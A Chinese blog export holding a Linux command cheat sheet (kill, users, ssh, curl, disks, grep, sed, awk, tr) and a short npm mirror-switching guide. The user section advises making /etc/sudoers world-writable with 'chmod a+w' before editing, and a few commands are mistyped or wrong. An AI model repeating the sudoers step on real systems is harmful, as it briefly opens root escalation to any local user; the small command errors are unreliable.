<h3 id="kill"><a href="#kill" class="headerlink" title="kill"></a>kill</h3><p><code>kill -stop pid</code> 发送SIGSTOP (17,19,23)停止一个进程，而并不消灭这个进程。</p>
<p><code>kill -cont pid</code> 发送SIGCONT (19,18,25)重新开始一个停止的进程。</p>
<p><code>kill -kill pid</code> 发送SIGKILL (9)强迫进程立即停止，并且不实施清理操作。</p>
<p><code>kill -9 -1</code> 终止你拥有的全部进程。</p>
<h3 id="top"><a href="#top" class="headerlink" title="top"></a>top</h3><p>动态显示任务管理器。</p>
<h3 id="free"><a href="#free" class="headerlink" title="free"></a>free</h3><p>查看内存使用情况。</p>
<p><code>-h</code> 自动转换单位，显示 B K M 等。</p>
<p>常用：</p>
<ul>
<li><code>free -h</code>，输出示例如下：</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ free -h</span><br><span class="line">              total        used        free      shared  buff/cache   available</span><br><span class="line">Mem:            62G         20G         13G         42M         28G         41G</span><br><span class="line">Swap:            0B          0B          0B</span><br></pre></td></tr></table></figure>

<h2 id="3-用户管理"><a href="#3-用户管理" class="headerlink" title="3. 用户管理"></a>3. 用户管理</h2><h3 id="linux多用户概念"><a href="#linux多用户概念" class="headerlink" title="linux多用户概念"></a>linux多用户概念</h3><p>root 权限最高的主用户，HOME目录为 &#x2F;root&#x2F;</p>
<p>其它(如test) 权限较小的用户，HOME目录一般为 &#x2F;home&#x2F;test&#x2F;</p>
<p><code>~</code> 用户HOME目录。 <code>cd ~</code> 或 <code>cd</code> 回到HOME目录，<code>cd ~/go/src/</code> 去HOME目录下的go&#x2F;src&#x2F;目录</p>
<p><code>/</code> 系统根目录。 &#x2F;bin&#x2F; 为系统根目录下的bin目录</p>
<h3 id="su"><a href="#su" class="headerlink" title="su"></a>su</h3><p>切换用户</p>
<p>格式：<br><code>su &lt;name&gt;</code> 切换到某个用户，没加用户名则默认登录root用户。</p>
<h3 id="useradd"><a href="#useradd" class="headerlink" title="useradd"></a>useradd</h3><p>创建新用户</p>
<p>格式：<br><code>useradd [-d home] [-s shell] [-c comment] [-m [-k template]] [-f inactive] [-e expire ] [-p passwd] [-r] name</code></p>
<p>主要选项：<br><code>-c</code>：加上备注文字，备注文字保存在passwd的备注栏中。<br><code>-d</code>：指定用户登入时的主目录。默认值&#x2F;home&#x2F;&lt;用户名&gt;<br><code>-D</code>：变更预设值。<br><code>-e</code>：指定账号的失效日期，日期格式为MM&#x2F;DD&#x2F;YY，例如06&#x2F;30&#x2F;12。缺省表示永久有效。<br><code>-f</code>：指定在密码过期后多少天即关闭该账号。如果为0账号立即被停用；如果为-1则账号一直可用。默认值为-1.<br><code>-g</code>：指定用户所属的群组。值可以使组名也可以是GID。用户组必须已经存在的，期默认值为100，即users。<br><code>-G</code>：指定用户所属的附加群组。<br><code>-m</code>：自动建立用户的登入目录。<br><code>-M</code>：不要自动建立用户的登入目录。<br><code>-n</code>：取消建立以用户名称为名的群组。<br><code>-r</code>：建立系统账号。<br><code>-s</code>：指定用户登入后所使用的shell。默认值为&#x2F;bin&#x2F;bash。<br><code>-u</code>：指定用户ID号。该值在系统中必须是唯一的。0~499默认是保留给系统用户账号使用的，所以该值必须大于499。</p>
<p>说明：<br>用 useradd 创建账号之后，<strong>再使用passwd设定账号的密码</strong>。<br>各<strong>用户</strong>的信息都保存在 <code>/etc/passwd</code> 文件中。<br>各<strong>用户组</strong>的信息都保存在 <code>/etc/group</code> 文件中。</p>
<p>示例：<br><code>useradd -m test</code> 创建test用户并自动建立用户登录目录</p>
<h3 id="passwd"><a href="#passwd" class="headerlink" title="passwd"></a>passwd</h3><p>格式：<br><code>passwd &lt;name&gt;</code> 为name用户创建密码</p>
<h3 id="赋予用户管理员权限"><a href="#赋予用户管理员权限" class="headerlink" title="赋予用户管理员权限"></a>赋予用户管理员权限</h3><p>修改 <code>/etc/sudoers</code> 文件如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># User privilege specification</span><br><span class="line">root    ALL=(ALL:ALL) ALL</span><br><span class="line">&lt;name&gt; ALL=(ALL:ALL) ALL</span><br></pre></td></tr></table></figure>

<p><strong>注意：</strong> 该文件是<strong>只读</strong>权限，需要先给文件增加写权限，再进行修改。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@iZuf697sx3nms8k9zb2kw4Z:~<span class="comment"># chmod a+w /etc/sudoers</span></span><br><span class="line">root@iZuf697sx3nms8k9zb2kw4Z:~<span class="comment"># vim /etc/sudoers</span></span><br></pre></td></tr></table></figure>

<p>修改完后还要将该文件<strong>改回</strong>只读权限，不然用户使用<code>sudo</code>时会报错：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo: /etc/sudoers is world writable</span><br><span class="line">sudo: no valid sudoers sources found, quitting</span><br><span class="line">sudo: unable to initialize policy plugin</span><br></pre></td></tr></table></figure>

<h3 id="userdel"><a href="#userdel" class="headerlink" title="userdel"></a>userdel</h3><p>格式：<br><code>userdel &lt;name&gt;</code> 删除名为name的用户</p>
<h2 id="4-网络管理"><a href="#4-网络管理" class="headerlink" title="4.网络管理"></a>4.网络管理</h2><h3 id="netstat"><a href="#netstat" class="headerlink" title="netstat"></a>netstat</h3><p>主要选项：</p>
<p><code>-t</code> 仅显示TCP相关选项<br><code>-u</code> 仅显示UDP相关选项<br><code>-n</code> 拒绝显示别名，能显示数字的全部转化为数字。直接通过ip地址，而不通过域名服务器<br><code>-l</code> 仅列出在Listen(监听)的服务状态<br><code>-p</code> 显示建立相关链接的程序名<br><code>-a</code> 显示所有连接中socket</p>
<p>常用：</p>
<p><code>netstat -tnlp</code></p>
<h3 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h3><p>远程连接。</p>
<p>一般默认安装，若不存在，则服务端需安装 <code>openssh-server</code> ，客户端需安装 <code>openssh-clients</code> 。</p>
<p>ssh 服务名为 <code>sshd</code> ，可通过 <code>service sshd start</code> 启动。</p>
<p>常用选项：</p>
<p><code>-p</code> 指定端口。<br><code>-i</code> 指定密钥。</p>
<p>示例：</p>
<ul>
<li><code>ssh root@192.168.0.20</code> 口令验证（密码）或密钥免密验证</li>
<li><code>ssh -i test.key test@192.168.0.12</code> 密钥登录指定密钥</li>
</ul>
<p>若采用密钥登录且登录时不需指定密钥，则需：</p>
<ol>
<li><p><code>ssh-keygen</code> 生成公密钥，默认在 <code>~/.ssh</code> 下生成公钥 <code>id_ras.pub</code> 和密钥 <code>id_rsa</code> ，可重命名。</p>
</li>
<li><p><code>ssh-copy-id -i ~/.ssh/id_rsa.pub user@ip</code> 将公钥传到服务器。</p>
</li>
<li><p>登录时指定密钥，或在 <code>~/.ssh/config</code> 中指定，如下：</p>
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Host <span class="number">192.168</span><span class="number">.0</span><span class="number">.20</span></span><br><span class="line">    Port <span class="number">22</span></span><br><span class="line">    User root</span><br><span class="line">    IdentityFile ~/.ssh/root.key</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="scp"><a href="#scp" class="headerlink" title="scp"></a>scp</h3><p>远程文件传输（上传&#x2F;下载）。</p>
<p>常用选项：</p>
<p><code>-p</code> 指定端口。<br><code>-i</code> 指定密钥。<br><code>-r</code> 递归文件夹，用于传文件。</p>
<p>常用：</p>
<ul>
<li><code>scp -r dir/ root@ip:~/dir</code> 上传文件夹。</li>
<li><code>scp root@ip:~/file file</code> 下载文件。</li>
</ul>
<h3 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h3><p>用于网络请求。</p>
<p>常用选项：</p>
<p><code>-X &lt;method&gt;</code> 指定请求方法 <code>GET</code> <code>POST</code> 等。<br><code>-d &lt;data&gt;</code> 参数用于发送 POST 请求的数据体，上传文件内的数据时，使用 <code>@file</code> 。<br><code>-H &lt;header&gt;</code> 参数添加 HTTP 请求的标头。<br><code>-x &lt;proxy&gt;</code> 参数指定 HTTP 请求的代理。<br><code>-v</code> 参数输出通信的整个过程，用于调试。<br><code>-o &lt;output file&gt;</code> 参数将服务器的回应保存成文件</p>
<p>常用：</p>
<ul>
<li>POST 发送 json 数据：</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -d <span class="string">&#x27;&#123;&quot;name&quot;: 6&#125;&#x27;</span> -X POST 192.168.0.1:8080/report</span><br></pre></td></tr></table></figure>

<p>参考：</p>
<ul>
<li><a href="http://www.ruanyifeng.com/blog/2019/09/curl-reference.html">http://www.ruanyifeng.com/blog/2019/09/curl-reference.html</a></li>
</ul>
<h2 id="5-磁盘管理"><a href="#5-磁盘管理" class="headerlink" title="5.磁盘管理"></a>5.磁盘管理</h2><h3 id="blkid"><a href="#blkid" class="headerlink" title="blkid"></a>blkid</h3><p>查看Linux系统上所有设备与分区（可以理解为每个硬盘）的文件系统类型、UUID、LABEL标签、挂载目录等信息。</p>
<p>换而言之，就是查看系统中的如磁盘、CD&#x2F;DVD、U盘之类的文件(linux将所有储存的东西都称为文件)位置及信息。</p>
<h3 id="mount"><a href="#mount" class="headerlink" title="mount"></a>mount</h3><p>将设备挂载到Linux上。</p>
<p>格式：<br><code>mount [-t vfstype] [-o options] &lt;device&gt; &lt;dir&gt;</code></p>
<p>主要选项：</p>
<p>1.<code>-t vfstype</code> 指定文件系统的类型，通常不必指定。mount 会自动选择正确的类型。<br>常用类型有：<br>光盘或光盘镜像：iso9660<br>DOS fat16文件系统：msdos<br>Windows 9x fat32文件系统：vfat<br>Windows NT ntfs文件系统：ntfs<br>Mount Windows文件网络共享：smbfs<br>UNIX(LINUX) 文件网络共享：nfs</p>
<p>2.<code>-o options</code> 主要用来描述设备或档案的挂接方式。常用的参数有：<br>loop：用来把一个文件当成硬盘分区挂接上系统<br>ro：采用只读方式挂接设备<br>rw：采用读写方式挂接设备<br>iocharset：指定访问文件系统所用字符集</p>
<p>3.<code>device</code>指明要挂载的设备(是一个文件)，设备文件通常在<code>/dev/</code>目录下。比如插入的CD&#x2F;DVD会是<code>/dev/sr0</code>文件。</p>
<p>4.<code>dir</code>设备在系统上的挂载点(是一个目录)。</p>
<p>示例：<code>mount /dev/sr0 /data</code> 将设备挂载到 <code>/data</code> 目录下。</p>
<h3 id="umount"><a href="#umount" class="headerlink" title="umount"></a>umount</h3><p>取消挂载，类似于弹出u盘</p>
<p>格式：</p>
<p><code>umount &lt;dir&gt;</code></p>
<p><code>dir</code>是挂载点目录</p>
<h3 id="du"><a href="#du" class="headerlink" title="du"></a>du</h3><p>说明:</p>
<p>显示文件和目录的磁盘使用空间大小。</p>
<p>命令选项：</p>
<p><code>-a</code> 显示目录中文件的大小，单位KB。</p>
<p><code>-b</code> 显示目录中文件的大小，以字节byte为单位。</p>
<p><code>-c</code> 显示目录中文件的大小，同时也显示总和；单位KB。</p>
<p><code>-k</code>\<code>-m</code> 显示目录中文件的大小，-k 单位KB，-m 单位MB。</p>
<p><code>-s</code> 仅显示目录的总值，单位KB。</p>
<p><code>-h</code> 以K  M  G为单位显示，提高可读性。</p>
<p><code>-x</code> 以一开始处理时的文件系统为准，若遇上其它不同的文件系统目录则略过。</p>
<p><code>-L</code> 显示选项中所指定符号链接的源文件大小。</p>
<p><code>-S</code> 显示个别目录的大小时，并不含其子目录的大小。</p>
<p><code>-X</code> 在&lt;文件&gt;指定目录或文件。</p>
<p><code>--exclude=&lt;目录或文件&gt;</code> 略过指定的目录或文件。</p>
<p><code>-D</code> 显示指定符号链接的源文件大小。</p>
<p><code>-H\--si</code> 与-h选项相同，但是K，M，G是以1000为换算单位。</p>
<p><code>-l</code> 重复计算硬件链接的文件。</p>
<p>常用：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 显示当前目录下各文件/文件夹的大小</span></span><br><span class="line"><span class="built_in">du</span> -sh *</span><br></pre></td></tr></table></figure>

<h3 id="df"><a href="#df" class="headerlink" title="df"></a>df</h3><p>显示系统上可使用的磁盘空间。</p>
<p>主要选项：</p>
<p><code>-h</code> 以容易阅读的方式显示<br><code>-T</code> 输出时显示文件系统类型</p>
<p>常用：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">df</span> -hT</span><br></pre></td></tr></table></figure>

<h3 id="fdisk"><a href="#fdisk" class="headerlink" title="fdisk"></a>fdisk</h3><p>划分磁盘分区。</p>
<p>常用：</p>
<ul>
<li>查看所有磁盘信息：</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">fdisk -l</span><br></pre></td></tr></table></figure>

<ul>
<li>对 &#x2F;dev&#x2F;sdb 磁盘进行分区操作：</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ fdisk /dev/sdb</span><br><span class="line">Command (m <span class="keyword">for</span> <span class="built_in">help</span>): m</span><br><span class="line">Command action</span><br><span class="line">   a   toggle a bootable flag</span><br><span class="line">   b   edit bsd disklabel</span><br><span class="line">   c   toggle the dos compatibility flag</span><br><span class="line">   d   delete a partition</span><br><span class="line">   l   list known partition types</span><br><span class="line">   m   <span class="built_in">print</span> this menu</span><br><span class="line">   n   add a new partition</span><br><span class="line">   o   create a new empty DOS partition table</span><br><span class="line">   p   <span class="built_in">print</span> the partition table</span><br><span class="line">   q   quit without saving changes</span><br><span class="line">   s   create a new empty Sun disklabel</span><br><span class="line">   t   change a partition<span class="string">&#x27;s system id</span></span><br><span class="line"><span class="string">   u   change display/entry units</span></span><br><span class="line"><span class="string">   v   verify the partition table</span></span><br><span class="line"><span class="string">   w   write table to disk and exit</span></span><br><span class="line"><span class="string">   x   extra functionality (experts only)</span></span><br></pre></td></tr></table></figure>

<p>对于 fdisk 各子命令的使用，请参考：<a href="https://blog.51cto.com/caochun/1722886">df、du、fdisk：Linux磁盘管理命令整理</a></p>
<h2 id="6-文本管理"><a href="#6-文本管理" class="headerlink" title="6. 文本管理"></a>6. 文本管理</h2><h3 id="grep"><a href="#grep" class="headerlink" title="grep"></a>grep</h3><p>查找字符串。在一个或多个输入文件中查找含有与指定模式(正则表达式)相匹配的字符串的行。</p>
<p>格式：<br><code>grep &lt;string&gt; &lt;dir&gt;</code></p>
<p>主要选项：</p>
<p><code>-c</code> 对匹配的行计数<br><code>-l</code> 只显示包含匹配的文件的文件名<br><code>-h</code> 抑制包含匹配文件的文件名的显示<br><code>-n</code> 每个匹配行只按照相对的行号显示<br><code>-i</code> 产生不区分大小写的匹配，缺省状态是区分大小写<br><code>-v</code> 列出不匹配的行<br><code>-E</code> 使用正则表达式<br><code>-o</code> 只打印匹配的部分<br><code>-P/--perl-regexp</code> 高级正则。Interpret PATTERN as a Perl regular expression.  This is highly experimental and grep -P  may  warn  of unimplemented features.</p>
<p>示例：</p>
<ul>
<li><p><code>grep magic /usr/src/*</code> 在‘&#x2F;usr&#x2F;src’目录下搜索带字符串‘magic’的文件。</p>
</li>
<li><p><code>cat hello.c | grep hello</code> 在 cat hello.c 后显示出来的内容中，查找hello字符串</p>
</li>
<li><p><code>blkid | grep -oP &#39;(?&lt;=UUID=&quot;).*?(?=&quot;)&#39;</code> 获取磁盘的UUID</p>
</li>
</ul>
<h3 id="echo"><a href="#echo" class="headerlink" title="echo"></a>echo</h3><p>将文本原样（参数）输出。</p>
<p>示例：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> hello world</span><br><span class="line">hello world</span><br></pre></td></tr></table></figure>

<p><code>-n</code> 默认情况下，echo输出的文本末尾会有一个回车符，-n 可以取消末尾的回车符。<br><code>-e</code> 默认情况下，echo参数加引号（双引号和单引号）会让特殊字符变成普通字符，-e会解释引号里面的特殊字符（比如换行符\n）。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> -e <span class="string">&quot;Hello\nWorld&quot;</span></span><br><span class="line">Hello</span><br><span class="line">World</span><br></pre></td></tr></table></figure>

<h3 id="sed"><a href="#sed" class="headerlink" title="sed"></a>sed</h3><p>强大的文本编辑工具，可以使用模式匹配进行替换编辑，与 vim 类似，但 sed 使用的是<strong>流式编辑</strong>：</p>
<ol>
<li>每次仅读取一行内容；</li>
<li>根据提供的规则命令匹配并修改数据。注意，sed <strong>默认不会直接修改源文件数据</strong>，而是会将数据复制到缓冲区中，修改也仅限于缓冲区中的数据；</li>
<li>将执行结果输出。</li>
</ol>
<p>常用选项：</p>
<p><code>-i</code> 直接修改源文件，慎用。</p>
<p>常用示例：</p>
<ul>
<li><code>sed &quot;s/my/your/g&quot; pets.txt</code></li>
</ul>
<p>详情参考：</p>
<ul>
<li><a href="https://coolshell.cn/articles/9104.html">SED 简明教程</a></li>
<li><a href="http://c.biancheng.net/view/4028.html">Linux sed命令完全攻略（超级详细）</a></li>
</ul>
<h3 id="awk"><a href="#awk" class="headerlink" title="awk"></a>awk</h3><p>一个强大的文本文件处理分析工具，和 sed 命令类似，awk 命令也是逐行扫描文件。</p>
<p>经典格式：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">awk <span class="string">&#x27;&lt;pattern&gt;&#123;&lt;action&gt;&#125;&#x27;</span> &lt;file&gt;</span><br></pre></td></tr></table></figure>

<p>pattern模式对每一行进行匹配，若匹配成功则对当前行执行action操作。模式和操作都是可选的，如果没有模式，则action应用到全部记录，如果没有action，则输出匹配全部记录。</p>
<p>常用选项：</p>
<p><code>-F</code> 指定分割符，默认分割符为<strong>空格</strong>或<strong>Tab</strong>，awk 会根据分隔符将<strong>每行</strong>分成多个字段。示例：<code>-F :</code> 指定冒号、<code>-F &#39;[;:]&#39;</code> 指定多个。</p>
<p>常用内建变量：</p>
<ul>
<li><code>$0</code> 当前记录（这个变量中存放着整个行的内容）</li>
<li><code>$1~$n</code> 当前记录的第n个字段，字段间由FS分隔</li>
<li><code>FS</code> 输入字段分隔符，默认是空格或Tab</li>
<li><code>NF</code> 当前记录中的字段个数，就是有多少列</li>
<li><code>NR</code> 已经读出的记录数，就是行号，从1开始，如果有多个文件话，这个值也是不断累加中。</li>
<li><code>FNR</code> 当前记录数，与NR不同的是，这个值会是各个文件自己的行号</li>
<li><code>RS</code> 输入的记录分隔符，默认为换行符</li>
<li><code>OFS</code> 输出字段分隔符，默认也是空格</li>
<li><code>ORS</code> 输出的记录分隔符，默认为换行符</li>
<li><code>FILENAME</code> 当前输入文件的名字</li>
</ul>
<p>常用示例：</p>
<ul>
<li><p>输出第1列和第4列</p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ netstat -tnlp | awk <span class="string">&#x27;&#123;print $1, $4&#125;&#x27;</span></span><br><span class="line">Proto Local</span><br><span class="line">tcp 0.0.0.0:29503</span><br><span class="line">tcp 127.0.0.1:1988</span><br><span class="line">tcp 0.0.0.0:8648</span><br><span class="line">tcp 0.0.0.0:8649</span><br></pre></td></tr></table></figure>
</li>
<li><p>条件判断、输出表头、格式化输出</p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ netstat -tnlp | awk <span class="string">&#x27;$3==0 &amp;&amp; $6==&quot;LISTEN&quot; || NR==1 &#123;printf &quot;%-20s %-20s %s\n&quot;,$4,$5,$6&#125;&#x27;</span></span><br><span class="line">Local                Address              Foreign</span><br><span class="line">0.0.0.0:29503        0.0.0.0:*            LISTEN</span><br><span class="line">127.0.0.1:1988       0.0.0.0:*            LISTEN</span><br><span class="line">0.0.0.0:8648         0.0.0.0:*            LISTEN</span><br><span class="line">0.0.0.0:8649         0.0.0.0:*            LISTEN</span><br></pre></td></tr></table></figure>
</li>
<li><p>指定分隔符和输出分隔符：</p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ awk  -F: <span class="string">&#x27;&#123;print $1,$3,$6&#125;&#x27;</span> OFS=<span class="string">&quot;\t&quot;</span> /etc/passwd</span><br><span class="line">root    0       /root</span><br><span class="line">bin     1       /bin</span><br></pre></td></tr></table></figure>
</li>
<li><p>模式匹配（正则），格式如<code>/模式/</code>、<code>~</code>表示匹配正则、<code>!~</code>表示不匹配正则：</p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ netstat -tnlp | awk <span class="string">&#x27;$6~/LIS*/ || NR==1 &#123;print NR,$4,$5,$6&#125;&#x27;</span> netstat.txt</span><br><span class="line">1 Local Address Foreign</span><br><span class="line">2 0.0.0.0:29503 0.0.0.0:* LISTEN</span><br><span class="line">3 127.0.0.1:1988 0.0.0.0:* LISTEN</span><br></pre></td></tr></table></figure>
</li>
<li><p>可自定义变量、<code>BEGIN&#123;&#125;</code> 指定读取文件前运行的动作、<code>END&#123;&#125;</code> 指定读取文件后运行的动作，如下示例统计文件的行数：</p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">awk <span class="string">&#x27;BEGIN&#123;count=0&#125;&#123;count=count+1&#125;END&#123;print count&#125;&#x27;</span> /etc/passwd</span><br></pre></td></tr></table></figure></li>
</ul>
<p>详情参考：</p>
<ul>
<li><a href="https://coolshell.cn/articles/9070.html">AWK 简明教程</a></li>
<li><a href="https://www.jianshu.com/p/8c6a0d0d4f0d">awk 简明教程</a></li>
</ul>
<h3 id="tr"><a href="#tr" class="headerlink" title="tr"></a>tr</h3><p>将输入字符串中，属于集合一的字符都替换成集合二中对应位置的字符，并输出。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">tr</span> [OPTION] SET1 [SET2]</span><br></pre></td></tr></table></figure>

<p>常用选项：</p>
<p><code>-d</code> 删除集合一中的字符<br><code>-s</code> 删除所有连续重复出现的属于集合一的字符，只保留第一个<br><code>-c</code> 用集合一的<strong>补集</strong>替换此集合，通常 <code>-cd</code> 连用</p>
<p>示例：</p>
<ul>
<li>小写转大写：</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">tr</span> [:lower:] [:upper:] <span class="string">&quot;adasfa&quot;</span></span><br><span class="line"><span class="built_in">tr</span> a-z A-Z <span class="string">&quot;asdafa&quot;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>删除非数字：</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> asdf121341hjhio9h0 | <span class="built_in">tr</span> -<span class="built_in">cd</span> 0-9 <span class="comment"># 12134190</span></span><br></pre></td></tr></table></figure>

<ul>
<li>将多个空格转换为一个减号：</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;20       1         3&quot;</span> | <span class="built_in">tr</span> -s <span class="string">&quot; &quot;</span> <span class="string">&quot;-&quot;</span> <span class="comment"># 20-1-3</span></span><br></pre></td></tr></table></figure>

<h2 id="7-杂项"><a href="#7-杂项" class="headerlink" title="7. 杂项"></a>7. 杂项</h2><h3 id="man"><a href="#man" class="headerlink" title="man"></a>man</h3><p>查看命令介绍。</p>
<h3 id="history"><a href="#history" class="headerlink" title="history"></a>history</h3><p>显示历史的输入指令。</p>
<h3 id="bc"><a href="#bc" class="headerlink" title="bc"></a>bc</h3><p>进入计算器模式，输入 <code>quit</code> 退出。</p>
<h3 id="alias"><a href="#alias" class="headerlink" title="alias"></a>alias</h3><p>为命令取别名。例如： 执行 <code>alias look=&#39;ll -a&#39;</code> ，即使得命令 <code>look</code> 等价于 <code>ll -a</code> 。当然，这样的别名意义不大。</p>
<p>我们可以用 <code>unalias look</code> 来删除这个别名。</p>
<p>我们也可以在bash配置文件添加这个自定义的命令(别名)，<code>vim ~/.bashrc</code> 或 <code>vim /etc/bashrc</code> ，一个相对于当前用户，一个相对于全体用户。</p>
<p>在**~&#x2F;.bashrc<strong>中加入：<code>alias serverOpen=&quot;python -m SimpleHTTPServer $1&quot;</code>。保存退出后，再</strong>执行 <code>source ~/.bashrc</code> 使得该配置生效**。这样之后，我们就可以用 <code>serverOpen 8080</code> 开启一个简单的8080端口的web服务器，不加端口则默认是8000端口。</p>
<h3 id="whereis"><a href="#whereis" class="headerlink" title="whereis"></a>whereis</h3><p>whereis命令只能用于搜索程序名，而且只搜索二进制文件（选项-b）、man说明文件（选项-m）和源代码文件（选项-s）。如果省略选项，则返回所有信息。</p>
<p>主要选项：<br><code>-b</code> 搜索二进制文件<br><code>-m</code> man说明文件<br><code>-s</code> 源码文件</p>
<p>示例：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ whereis vim</span><br><span class="line">vim: /usr/bin/vim.basic /usr/bin/vim.tiny /usr/bin/vim /etc/vim /usr/share/vim /usr/share/man/man1/vim.1.gz</span><br><span class="line">$ whereis python</span><br><span class="line">python: /usr/bin/python2.7 /usr/bin/python3.5 /usr/bin/python3.5m /usr/bin/python /usr/lib/python2.7 /usr/lib/python3.5 /etc/python2.7 /etc/python3.5 /etc/python /usr/local/lib/python2.7 /usr/local/lib/python3.5 /usr/share/python /usr/share/man/man1/python.1.gz</span><br></pre></td></tr></table></figure>

<h3 id="which"><a href="#which" class="headerlink" title="which"></a>which</h3><p>which命令是查找命令是否存在，以及命令的存放位置在哪儿。</p>
<p>示例：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">which</span> vim</span><br><span class="line">/usr/bin/vim</span><br><span class="line">$ <span class="built_in">which</span> python</span><br><span class="line">/usr/bin/python</span><br></pre></td></tr></table></figure>

<h3 id="whoami"><a href="#whoami" class="headerlink" title="whoami"></a>whoami</h3><p>显示当前用户的用户名</p>
]]></content>
      <categories>
        <category>九层之台，起于累土</category>
        <category>计算机系统</category>
      </categories>
      <tags>
        <tag>计算机系统</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>npm换源与入门</title>
    <url>/npm%E6%8D%A2%E6%BA%90%E4%B8%8E%E5%85%A5%E9%97%A8.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在WLS中下载安装node之后，需要进行npm换源处理，并重新入门npm。这是一次简单的入门笔记。</p>
<span id="more"></span>

<h3 id="npm换源"><a href="#npm换源" class="headerlink" title="npm换源"></a>npm换源</h3><p>由于npm下载源在国外，严重影响速度。因此，乐于分享的淘宝团队，将npm下载源部署到了国内。</p>
<blockquote>
<p>来自官网：“这是一个完整 npmjs.org 镜像，你可以用此代替官方版本(只读)，同步频率目前为 10分钟 一次以保证尽量与官方服务同步。”</p>
</blockquote>
<p>换源方法：</p>
<p>1.使用阿里定制的 cnpm 命令行工具代替默认的 npm，输入下面代码进行安装：</p>
<p><code>$ npm install -g cnpm --registry=https://registry.npm.taobao.org</code></p>
<p>以后安装插件只需要使用<code>cnpm intall</code>即可。</p>
<p>2.如果习惯了<code>npm</code>，又不想使用<code>cnpm</code>怎么办呢？也不是没有办法。</p>
<p>输入以下命令：</p>
<p><code>npm config set registry https://registry.npm.taobao.org</code></p>
<p>再输入：</p>
<p><code>npm config list</code></p>
<p>可以看到，已经换源了：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ npm config list</span><br><span class="line">; cli configs</span><br><span class="line">metrics-registry = &quot;https://registry.npm.taobao.org/&quot;</span><br><span class="line">scope = &quot;&quot;</span><br><span class="line">user-agent = &quot;npm/6.4.1 node/v10.15.1 linux x64&quot;</span><br><span class="line"></span><br><span class="line">; userconfig /home/dounine/.npmrc</span><br><span class="line">registry = &quot;https://registry.npm.taobao.org/&quot;</span><br><span class="line"></span><br><span class="line">; node bin location = /usr/app/node-v10.15.1/bin/node</span><br><span class="line">; cwd = /usr/app/node-v10.15.1/lib/node_modules</span><br><span class="line">; HOME = /home/dounine</span><br><span class="line">; &quot;npm config ls -l&quot; to show all defaults.</span><br></pre></td></tr></table></figure>

<h3 id="npm入门"><a href="#npm入门" class="headerlink" title="npm入门"></a>npm入门</h3><p>npm最常用的便是安装各种包。其中，分为 全局安装 和 本地安装：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install &lt;package&gt;      <span class="comment"># 本地安装</span></span><br><span class="line">npm install &lt;package&gt; -g   <span class="comment"># 全局安装</span></span><br></pre></td></tr></table></figure>

<h4 id="本地安装-安装到项目"><a href="#本地安装-安装到项目" class="headerlink" title="本地安装(安装到项目)"></a>本地安装(安装到项目)</h4><p>将安装包放在 <code>./node_modules</code> 下（运行 npm 命令时所在的目录，项目根目录），如果没有 node_modules 目录，会在当前执行 npm 命令的目录下生成 node_modules 目录。</p>
<p>可以通过 require() 来引入本地安装的包。</p>
<p>所以，我们第一次运行项目需要<code>npm install</code>的原因就是：<strong>下载所有项目依赖包</strong>。</p>
<p>注意：若在项目过程中需要引入外包，<code>npm install &lt;package&gt;</code> 不会将包录入<code>package.json</code>中。而，<code>npm install &lt;package&gt; --save</code>才会。<code>package.json</code>即每次<code>npm install</code>安装项目依赖包的参照文件。</p>
<h4 id="全局安装-安装到环境"><a href="#全局安装-安装到环境" class="headerlink" title="全局安装(安装到环境)"></a>全局安装(安装到环境)</h4><p>将安装包放在 <code>$NODE_HOME/lib/node_modules</code>，可以直接在命令行里使用。如：安装vue-cli：<code>npm install vue-cli -g</code>，安装完便可直接使用 <code>vue</code> 命令。</p>
<p>注意：进行全局安装时，若不是root用户则可能出现以下问题：</p>
<p><code>npm WARN checkPermissions Missing write access to /usr/app/node-v10.15.1/lib/node_modules</code></p>
<p><code>/usr/app/node-v10.15.1</code>是我地node安装目录，但对该目录修改需要root权限。</p>
<p>因此，全局安装命令应改为：<code>sudo npm install vue-cli -g</code></p>
<h4 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h4><p>在项目根目录下 <code>npm run dev</code></p>
<h4 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h4><p>在项目根目录下 <code>npm build</code></p>
